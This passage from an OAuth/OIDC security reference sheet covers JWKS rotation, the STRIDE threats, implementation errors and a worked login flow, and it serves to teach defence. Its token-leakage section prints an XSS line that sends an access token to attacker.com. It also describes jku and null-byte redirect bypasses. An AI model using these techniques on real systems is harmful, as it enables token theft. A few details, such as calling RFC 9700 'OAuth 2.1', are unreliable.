      "x": "...base64url-encoded x-coord...",
      "y": "...base64url-encoded y-coord..."
    }
  ]
}
```

### Key rotation algorithm

```
  AS:   1. Generate new keypair, kid = "rsa-2025-q1".
        2. Publish in JWKS alongside old keys.
        3. Wait propagation interval T_propagate (≥ max-cache TTL of any RP).
        4. Begin signing new tokens with kid="rsa-2025-q1".
        5. Wait T_old (≥ max access_token TTL).
        6. Remove old kid from JWKS.

  RP:   On signature verify:
        1. Read header.kid from incoming JWT.
        2. Lookup kid in cached JWKS.
        3. If miss AND cache is older than min_refresh_interval:
              refetch JWKS, retry lookup.
        4. If still miss → reject.
```

### Cache TTL math

Cache hit ratio with TTL $T$ and rotation interval $R$:

$$\text{hit ratio} \approx 1 - \frac{T}{T + \mu \cdot R}$$

where $\mu$ is the request-rate ratio. Practical numbers:

| Cache TTL | Rotation interval | RPS to AS / RP | Cost @ 1k RP-RPS |
|:---:|:---:|:---:|:---:|
| no cache | n/a | 1 (every JWT verify) | 1k JWKS fetch/sec ⇒ DDoS the AS |
| 5 min | weekly | 1/300 | 3.3 fetch/sec — trivial |
| 1 h | weekly | 1/3600 | 0.28 fetch/sec — trivial |
| 24 h | weekly | 1/86400 | 0.012 fetch/sec — recommended |
| 7 days | weekly | 1/604800 | 0.0017 fetch/sec — maximum |

### Stale-while-revalidate for JWKS

```
on JWT-verify:
   key = jwks_cache.get(kid)
   if key == nil:
      // miss
      if jwks_cache.last_fetch_succeeded > now - min_refetch_interval:
          // backoff — known-bad key
          return reject
      key = jwks_cache.refetch()
      if key == nil:
          return reject
   else if jwks_cache.age > soft_ttl AND not currently_refreshing:
      // background refresh — return stale key NOW, refresh async
      go jwks_cache.refetch_async()
   verify(jwt, key)
```

Soft-TTL + hard-TTL pattern:

| Phase | Behaviour |
|:---|:---|
| age < soft_ttl (e.g. 24 h) | Use cache, no refresh |
| soft_ttl ≤ age < hard_ttl | Use cache, trigger background refresh |
| age ≥ hard_ttl OR kid miss | Block on synchronous refetch |

#### Thundering herd avoidance

Without coordination, when soft-TTL elapses on a busy RP, every concurrent verify may try to refetch.

**Singleflight pattern**: only one in-flight refresh per kid; concurrent waiters share the result.

```go
import "golang.org/x/sync/singleflight"

var sfg singleflight.Group

func refresh(kid string) (Key, error) {
    v, err, _ := sfg.Do(kid, func() (any, error) {
        return fetchJWKS(kid)
    })
    return v.(Key), err
}
```

---

## OAuth 2.1 / OIDC Hardening

OAuth 2.1 (RFC 9700, BCP 240) consolidates 12 years of best-current-practice guidance:

| Change | OAuth 2.0 | OAuth 2.1 |
|:---|:---:|:---:|
| PKCE | Optional (recommended) | **MANDATORY for all client types** including confidential |
| Implicit grant | Allowed (deprecated) | **REMOVED** |
| Password grant (ROPC) | Allowed (deprecated) | **REMOVED** |
| Refresh-token rotation for public clients | Recommended | **MANDATORY** |
| Redirect URI matching | "Approximate" allowed | **Exact-match string compare** (no wildcards, no path manipulation) |
| Bearer-token in URL query | Discouraged | **PROHIBITED** |
| `state` parameter | Recommended | **REQUIRED** if not using PKCE binding |
| Resource Indicator (`resource` parameter, RFC 8707) | Optional | **RECOMMENDED** for audience restriction |

### Exact-match redirect URI

```
REGISTERED:  https://app.example.com/cb
ALLOWED:     https://app.example.com/cb            ✓
             https://app.example.com/cb/           ✗ (trailing slash differs)
             https://app.example.com/cb?x=1        ✓ (extra query allowed if registered with empty query)
             https://app.example.com/CB            ✗ (case differs)
             https://app.example.com:443/cb        ✓ (port-norm OK)
             https://app.example.com:8443/cb       ✗ (port differs)
             https://app.example.com/cb#frag       ✗ (fragment never matches)
             http://app.example.com/cb             ✗ (scheme differs)
```

OAuth 2.1 explicitly forbids path-glob/wildcard matching such as `https://*.example.com/cb`.

### Native-app redirect URIs (RFC 8252)

For installed apps:

| Pattern | Example | Risk |
|:---|:---|:---|
| Loopback IP + dynamic port | `http://127.0.0.1:54123/cb` | Recommended for desktop |
| Private-use URI scheme | `com.example.app:/cb` | OK — app must own the scheme via Android intent / iOS Universal Link |
| HTTPS with Universal/App Links | `https://app.example.com/cb` | Strongest — domain-level binding |
| Custom scheme without OS binding | `myapp:///cb` | **Vulnerable** to scheme hijacking |

---

## Threat Model — STRIDE applied

### S — Spoofing

| Threat | Vector | Mitigation |
|:---|:---|:---|
| Authorization-server spoof | Phished login page | TLS pin, branded URLs, FIDO/WebAuthn at IdP |
| Resource-server spoof | DNS hijack | mTLS (RFC 8705), audience restriction |
| Client spoof | Stolen `client_id` | Confidential clients with `client_secret` or `private_key_jwt`; PKCE for public |
| User spoof at consent | Session-fixation | Bind `state` to session, invalidate after use |

### T — Tampering

| Threat | Vector | Mitigation |
|:---|:---|:---|
| Code interception in front-channel | TLS-strip, malicious browser plugin | PKCE binds verifier→challenge cryptographically |
| ID-token tampering | Network MITM | JWS signature; alg-pinning to prevent `none`-attack |
| `at_hash` substitution | MITM swaps tokens | `at_hash` in id_token binds to access_token |
| Discovery-doc tampering | DNS hijack of `.well-known` | TLS, signed metadata (RFC 8414 §3.2 — JWS-signed metadata) |

### R — Repudiation

| Threat | Mitigation |
|:---|:---|
| User denies consent occurred | AS audit log of `/authorize` consent grant + IP + UA |
| Client denies token request | `/token` log with client auth method + `jti` of resulting token |
| Resource access denial | RS log w/ token `jti` + `sub` + audience |

### I — Information disclosure

| Threat | Vector | Mitigation |
|:---|:---|:---|
| Token in URL → Referer header | Redirect from page containing token in fragment | Use `response_mode=form_post` or POST callback |
| Token in browser history | Implicit grant in URL fragment | OAuth 2.1 removes implicit grant |
| Token in logs | Server-side access logs include URL | Redact bearer headers; never log tokens |
| Token in localStorage / sessionStorage | XSS exfiltration | HttpOnly cookies for refresh, BFF pattern |
| Refresh token in client-side storage | Inspectable on disk | Encrypted at rest, OS keystore |

### D — Denial of service

| Threat | Mitigation |
|:---|:---|
| `/token` endpoint flood | Rate limit per `client_id` + IP; CAPTCHA on `/authorize` |
| JWKS endpoint flood | CDN, long cache TTL, content-addressable URLs (`/.well-known/jwks-{epoch}.json`) |
| Refresh-token enumeration | Constant-time lookup; rate-limit failures |

### E — Elevation of privilege

| Threat | Vector | Mitigation |
|:---|:---|:---|
| Scope upgrade in refresh | Client requests broader scopes than originally granted | AS enforces: refresh scopes ⊆ original scopes |
| Confused deputy | RS accepts token issued for another RS | Audience check (`aud == this_RS`); use `resource` param (RFC 8707) |
| Mix-up attack | Multi-AS client tricked into routing token to wrong AS | RFC 9207 — `iss` parameter in authorization response, exact-match check |
| Cross-site request forgery | Attacker forges redirect | `state` parameter validation |
| Replay | Stolen ID token reused | `nonce` validation, `iat` freshness, single-use enforcement |

### Mix-up attack (RFC 9207)

```
Setup: Client C trusts both AS_honest and AS_attacker.
       Both have user accounts; user has ONLY consented at AS_honest.

Attack:
  1. User clicks "Login with Honest" — C generates state S, code_verifier V, sends to AS_honest.
  2. Attacker MITMs the redirect, swaps the AS-discovery indication.
  3. C now thinks it just got code from AS_honest, but actually the code came from AS_attacker.
  4. C calls AS_attacker /token with V (which AS_attacker doesn't know about — but PKCE saves us in the simple case).
  5. AS_attacker can craft accepting flow: now C is authenticated as USER@AS_attacker but UI says "Honest".
  6. User uploads sensitive data into wrong account.

Mitigation: AS_honest includes `iss=https://honest.example` in the redirect.
Client checks: response.iss ?= AS-it-was-talking-to.iss
```

### Token leakage via XSS

If `access_token` is in JS-readable storage:

```
attacker XSS payload → fetch('/api/x', { headers: { Authorization: 'Bearer ' + localStorage.access_token }})
              → exfiltrate response or use token via fetch('https://attacker.com/?t=' + localStorage.access_token)
```

Mitigations:

1. **Don't store tokens in JS-accessible storage.** Use HttpOnly cookies or BFF pattern.
2. **Short access-token TTL** (5–15 min) bounds exposure.
3. **DPoP** binds tokens to client-held key; XSS-stolen token without key is useless.
4. **mTLS** binding (RFC 8705) — same idea, different transport.
5. **Token binding** to TLS exporter (deprecated; was Token Binding Protocol).

### Phishing of the consent screen

User on `attacker.com` is shown a fake "Login with Google" button that opens a real Google consent screen — but for ATTACKER's app requesting `email + drive.read`. User absent-mindedly approves.

Mitigations:

1. **AS branding limits** — restrict client display name to plain text, no homograph chars.
2. **No auto-approval** for new consent — always show consent screen the first time.
3. **Domain verification** — show client's verified domain prominently.
4. **Risk-based step-up** — new client + sensitive scopes ⇒ require MFA + re-auth.
5. **App review** for sensitive scopes (Google's "verified app" gate, GitHub's OAuth review).

---

## Device Authorization Grant

Per RFC 8628.

### Flow

```
  ┌──────────┐                         ┌─────────────┐
  │  Device  │                         │   AuthSrv   │
  └────┬─────┘                         └──────┬──────┘
       │                                      │
       │ 1. POST /device_authorization        │
       │    client_id=device&scope=read       │
       │─────────────────────────────────────>│
       │                                      │
       │ 2. 200 {                             │
       │     "device_code": "GhSvJVi3",       │
       │     "user_code": "WDJB-MJHT",        │
       │     "verification_uri":              │
       │       "https://idp.ex/device",       │
       │     "verification_uri_complete":     │
       │       "https://idp.ex/device?code=WDJB-MJHT", │
       │     "expires_in": 1800,              │
       │     "interval": 5                    │
       │    }                                 │
       │<─────────────────────────────────────│
       │                                      │
       │ 3. Display user_code to human, e.g.  │
       │    "Visit example.com/device         │
       │     and enter WDJB-MJHT"             │
       │                                      │
       │ 4. Begin polling /token              │
       │    every interval seconds            │
       │                                      │
       │ POST /token                          │
       │   grant_type=urn:ietf:params:oauth:grant-type:device_code │
       │   device_code=GhSvJVi3&              │
       │   client_id=device                   │
       │─────────────────────────────────────>│
       │ 200/400 (see below)                  │
       │<─────────────────────────────────────│
       │   ... poll ... poll ... poll ...     │
       │                                      │
  (Meanwhile, separately:)                    │
  Human visits verification_uri on phone,     │
  enters user_code, authenticates, consents.  │
       │                                      │
       │ Eventually POST /token returns       │
       │   200 { access_token, ... }          │
```

### Polling response semantics

| HTTP | `error` | Meaning | Client action |
|:---:|:---|:---|:---|
| 200 | n/a | Tokens issued | Stop polling, use tokens |
| 400 | `authorization_pending` | User hasn't approved yet | Continue at current `interval` |
| 400 | `slow_down` | Polling too fast | Increase `interval` by ≥ 5 sec |
| 400 | `expired_token` | `device_code` expired | Restart from /device_authorization |
| 400 | `access_denied` | User declined | Stop, surface error |

### Polling math

```
Default interval                   : 5 seconds
Max device_code lifetime          : 30 minutes (typical)
Max polls before expiry           : 30 * 60 / 5 = 360
Bandwidth per device per minute   : ~12 polls × ~500 bytes = 6 KB/min
```

For a fleet of N devices polling concurrently:

$$\text{rps to /token} = \frac{N}{\text{interval}}$$

A 100k-device fleet at default 5-sec interval ⇒ 20k req/sec to `/token` worst case. AS implementations typically apply `slow_down` to spread load.

### `user_code` entropy

Typical formats:

```
"WDJB-MJHT"    8 chars from [A-HJ-NP-Z23-9]   → 26^8 / readability filter ≈ 32 bits
"123-456-789"  9 digits                        → 10^9 ≈ 30 bits
"ABCD-EFGH-JKMN" 12 chars                       → ~44 bits
```

User codes are short by design — humans must type them — but they are coupled to a `device_code` that has full 256-bit entropy. The AS rate-limits failed `user_code` entries and ties the `user_code` to a single `device_code` so brute force has bounded utility.

---

## Common Implementation Errors

### 1. Tokens leaking in `Referer`

**Bug**: page contains `https://app.example/cb#access_token=...` (implicit grant). User clicks an outbound link → browser sends `Referer: https://app.example/cb#access_token=...` to the next site.

**Fix**: Don't use implicit grant. If you must reflect a token in a URL, use `response_mode=form_post`. Add `Referrer-Policy: no-referrer` header.

### 2. Storing `client_secret` in JS / mobile app

**Bug**: confidential-client `client_secret` shipped inside an SPA bundle or APK. Anyone with the binary extracts it.

**Fix**: SPAs and native apps are PUBLIC clients. Use `authorization_code + PKCE` with no `client_secret`. Never embed secrets in client-side code.

### 3. Skipping signature verification — "alg=none" attack

**Bug**: JWT library accepts `{"alg": "none"}` header → no signature check. Attacker forges any payload.

**Fix**: Pin allowed `alg` set in client config; reject `none` explicitly. Many OIDC libraries had this CVE in 2015.

```python
# WRONG
claims = jwt.decode(token, options={"verify_signature": False})

# RIGHT
claims = jwt.decode(token, key=jwk, algorithms=["RS256", "ES256"])
```

### 4. Accepting any `iss`

**Bug**: RP doesn't pin issuer. Attacker mints ID token with their own AS as `iss`, signed with their own keys.

**Fix**: Compare `iss` to discovery `issuer` exactly. Reject mismatch.

### 5. Long-lived refresh tokens without rotation

**Bug**: `refresh_token` valid for 1 year, never rotated. Attacker steals it once → 1-year persistent access.

**Fix**: Rotate on every use. Detect re-use. Cap absolute lifetime even with rotation.

### 6. Not validating `at_hash`

**Bug**: hybrid flow returns `id_token` and `access_token` in same response; RP validates the ID token but ignores `at_hash`. Attacker can swap the access token, still see a valid ID token.

**Fix**: Compute `at_hash = BASE64URL(SHA-N(access_token))[0:N/16]` and compare to `payload.at_hash`.

### 7. HS256 with publicly known shared secret

**Bug**: ID token signed with HMAC where the "secret" is the `client_secret` known by N relying parties. Any RP can mint ID tokens for any other RP.

**Fix**: Use asymmetric algorithms (`RS256`, `ES256`, `EdDSA`) for OIDC ID tokens — only the AS holds the private key.

### 8. Confused deputy attacks

**Bug**: RS accepts any well-signed token without checking `aud`. Token issued for `api.foo` is replayed at `api.bar`, which honors it.

**Fix**: RS MUST check `aud == this-resource`. Use `resource` parameter (RFC 8707) at `/token` to scope the AT to a specific RS.

```python
# At token introspection / verification
if "api.bar.example.com" not in claims["aud"]:
    raise InvalidAudienceError
```

### 9. PKCE missing on public clients

**Bug**: SPA uses `authorization_code` without PKCE. Code intercepted in browser history / extension / network → exchanged for tokens.

**Fix**: Mandatory PKCE for all public clients. OAuth 2.1 enforces this for all clients.

### 10. Storing tokens in localStorage

**Bug**: SPA stores `access_token` in `localStorage`. Any XSS reads it.

**Fix**: BFF (Backend-for-Frontend) pattern: server holds tokens, sets HttpOnly cookie; SPA never sees tokens. Or use service-worker-mediated storage.

### 11. Improper logout — only client-side

**Bug**: app's "logout" button only deletes local cookies/state, doesn't notify AS. User remains logged in at IdP; next OAuth flow auto-completes (SSO behavior).

**Fix**: Implement OIDC RP-Initiated Logout (`end_session_endpoint`). Optionally implement OIDC Back-Channel Logout for federated session termination.

```http
GET https://idp.example/end_session
   ?id_token_hint=eyJ...
   &post_logout_redirect_uri=https://app.example/loggedout
   &state=opaque
```

### 12. Missing `aud` validation in resource server

**Bug**: RS accepts any token signed by trusted JWKS, regardless of audience.

**Fix**: Strict `aud` check. Plus resource parameter (RFC 8707) at request time.

### 13. Bonus — cross-site `state` reuse

**Bug**: client uses constant `state="x"` across sessions. CSRF protection void.

**Fix**: Generate fresh ≥128-bit random `state` per `/authorize`, bind to user session.

### 14. Bonus — JWKS kid trust

**Bug**: JWT header points `jku` at `https://attacker.com/jwks.json`. Library blindly fetches it.

**Fix**: Ignore `jku` header. Always resolve keys from pre-configured (discovery-derived) `jwks_uri`.

### 15. Bonus — null-byte in redirect_uri

**Bug**: AS uses substring match on redirect_uri. `https://app.example.com/cb%00.attacker.com/...` matches.

**Fix**: Exact-string equality on the FULL URI as registered. Reject any URI with control chars after parsing.

---

## Mathematical Performance Models

### Signature operation cost (per op, single-thread, x86_64 @ 2.4 GHz)

| Op | Algorithm | Latency | Throughput / core |
|:---|:---|:---:|:---:|
| Sign | HS256 | ~1 µs | 1,000,000 / sec |
| Verify | HS256 | ~1 µs | 1,000,000 / sec |
| Sign | RS256 (2048) | ~1.5 ms | ~700 / sec |
| Verify | RS256 (2048) | ~50 µs | ~20,000 / sec |
| Sign | RS256 (4096) | ~10 ms | ~100 / sec |
| Verify | RS256 (4096) | ~200 µs | ~5,000 / sec |
| Sign | ES256 | ~250 µs | ~4,000 / sec |
| Verify | ES256 | ~700 µs | ~1,500 / sec |
| Sign | EdDSA / Ed25519 | ~50 µs | ~20,000 / sec |
| Verify | Ed25519 | ~150 µs | ~6,500 / sec |

**Insight**: RS256 verification is the cheap side of an asymmetric pair, and JWT verifies vastly outnumber signs (1 sign at AS → N verifies at RS fan-out). RS256 is a reasonable default. ES256 is more compact but slower to verify.

### Bearer-token verification cost @ scale

For 10,000 RPS of Bearer-token-protected API, with stateless JWT RS256 verification:

```
RPS_total = 10,000 / sec
Per-verify CPU = 50 µs / verify
Total CPU = 500,000 µs / sec = 0.5 sec / sec = 50% of one core
=> 1 vCPU dedicated to JWT verification at 10k RPS

vs opaque introspection:
  Per-introspect = 1 ms RTT + 0.5 ms AS work = 1.5 ms latency
  AS load = 10k introspects / sec — needs many AS replicas
  Network = 10k * 1 KB = 10 MB / sec on AS link
```

JWT scales horizontally (each RS verifies independently). Opaque concentrates load on AS.

### JWKS network round-trip cost amortized over cache TTL

```
fetch_cost           = ~100 ms (TLS handshake amortized + TCP + 1 RTT app)
fetch_size           = ~2 KB (5 keys, RS256)
cache_ttl            = 86400 sec (24 h)
verify_per_sec_per_RP = 10,000 RPS

fetches_per_sec      = 1 / 86400
  amortized_latency  = 100 ms / (86400 × 10,000) = 116 picoseconds per verify
  amortized_bandwidth= 2 KB / 86400 = 23 bytes / sec per RP
```

JWKS retrieval is essentially free at steady state; the dominant work is per-verify signature math.

### Token-bucket rate limit on /oauth/token

```
Bucket size B   = 60 tokens (allow burst)
Refill rate r   = 1 token / sec  (sustained 1 RPS)

at time t: bucket = min(B, last_bucket + (t - last_t) * r)
  if bucket >= 1: bucket--; allow
  else:           reject (429)
```

Math: a client can do up to B requests in a burst, then sustain at rate r. For `/oauth/token` per `client_id`, typical: B=10, r=1/sec. For `/oauth/token` per IP, typical: B=60, r=10/sec.

### Sliding-window vs fixed-window

Fixed window (every minute resets): a client can do 2× the limit at the boundary (last sec of window + first sec of next).

```
Limit: 100/minute
At 12:00:59  - send 100 → all allowed
At 12:01:00  - window resets, send 100 → all allowed
=> 200 in 2 sec.
```

Sliding window (last 60 sec): smooth.

```
sum_requests_in_last_60_sec >= 100 → reject
```

Implementation: log every request with timestamp, query `count(WHERE ts > now-60)`. Or precise: store per-second buckets, sum the last 60.

### Redis-backed token-bucket pseudocode

```python
LUA = """
local key = KEYS[1]
local now = tonumber(ARGV[1])
local rate = tonumber(ARGV[2])
local burst = tonumber(ARGV[3])
local last = redis.call("HMGET", key, "tok", "ts")
local tok = tonumber(last[1]) or burst
local ts = tonumber(last[2]) or now
tok = math.min(burst, tok + (now - ts) * rate)
if tok < 1 then return 0 end
tok = tok - 1
redis.call("HMSET", key, "tok", tok, "ts", now)
redis.call("EXPIRE", key, 60)
return 1
"""
```

Atomic via Lua, distributed-safe across N AS replicas.

---

## Worked end-to-end example with concrete numbers

Scenario: SPA at `https://app.example` logging in via OIDC at `https://idp.example`.

```
client_id          = "spa-prod-001"
redirect_uri       = "https://app.example/cb"   // exact-match registered
scopes             = "openid email profile offline_access"
PKCE method        = "S256"

Random generation (per-login):
  state           = random_b64url(16)            = "qP3vN8zXkY2L..."   // 16 bytes → 22 chars
  nonce           = random_b64url(16)            = "rT9wM2bAjE5F..."
  code_verifier   = random_b64url(32)            = "kGm7vP9xQ2nR4..."   // 32 bytes → 43 chars
  code_challenge  = base64url(sha256(verifier))  = "Xy8mPnQrK3vL..."   // 32 bytes → 43 chars

Step 1 — /authorize:
  GET https://idp.example/oauth/authorize?
        response_type=code&
        client_id=spa-prod-001&
        redirect_uri=https%3A%2F%2Fapp.example%2Fcb&
        scope=openid+email+profile+offline_access&
        state=qP3vN8zXkY2L...&
        nonce=rT9wM2bAjE5F...&
        code_challenge=Xy8mPnQrK3vL...&
        code_challenge_method=S256

Step 2 — user authenticates at IdP (TOTP / WebAuthn / etc).

Step 3 — IdP redirects:
  HTTP/1.1 302 Found
  Location: https://app.example/cb?
              code=GH8jK2pX9vNmQ7rL...&
              state=qP3vN8zXkY2L...&
              iss=https%3A%2F%2Fidp.example

  // Client validates: state == stored, iss matches discovery.

Step 4 — /token:
  POST https://idp.example/oauth/token
  Content-Type: application/x-www-form-urlencoded

  grant_type=authorization_code&
  code=GH8jK2pX9vNmQ7rL...&
  redirect_uri=https%3A%2F%2Fapp.example%2Fcb&
  client_id=spa-prod-001&
  code_verifier=kGm7vP9xQ2nR4...

Step 5 — Token response:
  HTTP/1.1 200 OK
  Content-Type: application/json

  {
    "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    "token_type": "Bearer",
    "expires_in": 600,                       // 10 min
    "refresh_token": "rT_8a7H2pWvF5xQ...",
    "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6InJzYS0yMDI1LXEyIn0...",
    "scope": "openid email profile offline_access"
  }

Step 6 — ID token decoded:
  Header:
    { "alg": "RS256", "typ": "JWT", "kid": "rsa-2025-q2" }

  Payload:
    {
      "iss": "https://idp.example",
      "aud": "spa-prod-001",
      "sub": "auth0|6543210abc",
      "exp": 1714201200,              // 600 sec from iat
      "iat": 1714200600,
      "auth_time": 1714200580,
      "nonce": "rT9wM2bAjE5F...",     // matches client-stored nonce
      "at_hash": "Yq2Pn9KrM5..."      // = base64url(sha256(access_token))[0:16]
    }

Step 7 — RP validates ID token (12 steps):
  1. iss == discovery.issuer                                ✓
  2. client_id ∈ aud                                        ✓
  3. azp absent (single aud) — OK                          ✓
  4. RSA-SHA256 verify with kid="rsa-2025-q2" from JWKS    ✓
  5. alg == "RS256" ∈ allowed                               ✓
  6. exp > now                                              ✓
  7. iat freshness (within 15 min)                          ✓
  8. nonce == stored nonce                                  ✓
  9. acr / amr — none requested                             skip
  10. auth_time — no max_age constraint                     skip
  11. at_hash check (since access_token present)            ✓
  12. c_hash — only if response_type=code id_token          skip

  Subject = "auth0|6543210abc" — establish session.

Step 8 — call resource server:
  GET https://api.example/me
  Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

  RS verifies access_token (RS256 signature, aud, exp), returns user data.

Step 9 — at t=590, refresh:
  POST https://idp.example/oauth/token
  grant_type=refresh_token&
  refresh_token=rT_8a7H2pWvF5xQ...&
  client_id=spa-prod-001

  Response:
    {
      "access_token": "<new>",
      "refresh_token": "<NEW>",       // rotated
      "expires_in": 600,
      ...
    }

  Old refresh token is now invalid; if it's ever submitted again,
  the AS revokes the entire token chain.
```

---

## Quick reference — `cs` corpus tokens

```
cs sheets/auth/oidc           # OIDC mechanics
cs sheets/auth/saml           # SAML 2.0 mechanics for compare-and-contrast
cs sheets/security/jwt        # JWT bearer-token detail
cs sheets/security/oauth      # OAuth flows, scopes, common bugs
cs sheets/security/tls        # transport for everything above
cs sheets/ramp-up/oauth-oidc-eli5  # narrative ELI5 walk-through

cs detail/auth/oidc           # JWT signature math, entropy bounds
cs detail/security/jwt        # PKCS1 / ECDSA verify formal
cs detail/security/tls        # AEAD, key exchange in OAuth transport
cs detail/auth/saml           # SAML for cross-protocol compare
```

---

## See Also

- `auth/oidc`
- `auth/saml`
- `security/oauth`
- `security/jwt`
- `security/tls`
- `ramp-up/oauth-oidc-eli5`

---

## References

- RFC 6749 — The OAuth 2.0 Authorization Framework
- RFC 6750 — OAuth 2.0 Authorization Framework: Bearer Token Usage
- RFC 6819 — OAuth 2.0 Threat Model and Security Considerations
- RFC 7009 — OAuth 2.0 Token Revocation
- RFC 7515 — JSON Web Signature (JWS)
- RFC 7516 — JSON Web Encryption (JWE)
- RFC 7517 — JSON Web Key (JWK)
- RFC 7518 — JSON Web Algorithms (JWA)
- RFC 7519 — JSON Web Token (JWT)
- RFC 7521 — Assertion Framework for OAuth 2.0 Client Authentication and Authorization Grants
- RFC 7522 — SAML 2.0 Profile for OAuth 2.0 Client Authentication and Authorization Grants
- RFC 7523 — JSON Web Token (JWT) Profile for OAuth 2.0 Client Authentication and Authorization Grants
- RFC 7591 — OAuth 2.0 Dynamic Client Registration Protocol
- RFC 7592 — OAuth 2.0 Dynamic Client Registration Management Protocol
- RFC 7636 — Proof Key for Code Exchange by OAuth Public Clients (PKCE)
- RFC 7638 — JSON Web Key (JWK) Thumbprint
- RFC 7662 — OAuth 2.0 Token Introspection
- RFC 8252 — OAuth 2.0 for Native Apps (BCP 212)
- RFC 8414 — OAuth 2.0 Authorization Server Metadata
- RFC 8628 — OAuth 2.0 Device Authorization Grant
- RFC 8693 — OAuth 2.0 Token Exchange
- RFC 8705 — OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens
- RFC 8707 — Resource Indicators for OAuth 2.0
- RFC 9068 — JSON Web Token (JWT) Profile for OAuth 2.0 Access Tokens
- RFC 9101 — OAuth 2.0 JWT-Secured Authorization Request (JAR)
- RFC 9126 — OAuth 2.0 Pushed Authorization Requests (PAR)
- RFC 9207 — OAuth 2.0 Authorization Server Issuer Identification
- RFC 9396 — OAuth 2.0 Rich Authorization Requests (RAR)
- RFC 9449 — OAuth 2.0 Demonstrating Proof of Possession (DPoP)
- RFC 9700 — Best Current Practice for OAuth 2.0 Security (BCP 240) — "OAuth 2.1"
- OpenID Connect Core 1.0 — https://openid.net/specs/openid-connect-core-1_0.html
- OpenID Connect Discovery 1.0 — https://openid.net/specs/openid-connect-discovery-1_0.html
- OpenID Connect Dynamic Client Registration 1.0 — https://openid.net/specs/openid-connect-registration-1_0.html
- OpenID Connect Session Management 1.0 — https://openid.net/specs/openid-connect-session-1_0.html
- OpenID Connect RP-Initiated Logout 1.0 — https://openid.net/specs/openid-connect-rpinitiated-1_0.html
- OpenID Connect Front-Channel Logout 1.0 — https://openid.net/specs/openid-connect-frontchannel-1_0.html
- OpenID Connect Back-Channel Logout 1.0 — https://openid.net/specs/openid-connect-backchannel-1_0.html
- OpenID Financial-grade API (FAPI) 2.0 Security Profile
- NIST SP 800-63C — Federation Assurance Levels
- NIST SP 800-131A — Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths
- FIPS 186-5 — Digital Signature Standard (ECDSA, EdDSA)
- FIPS 198-1 — The Keyed-Hash Message Authentication Code (HMAC)
- OWASP — OAuth 2.0 Cheat Sheet
- OWASP — JSON Web Token Cheat Sheet
- OWASP — Authentication Cheat Sheet
- IANA — OAuth Parameters Registry
- IANA — JWT Claims Registry
- IANA — JSON Web Signature and Encryption Algorithms Registry
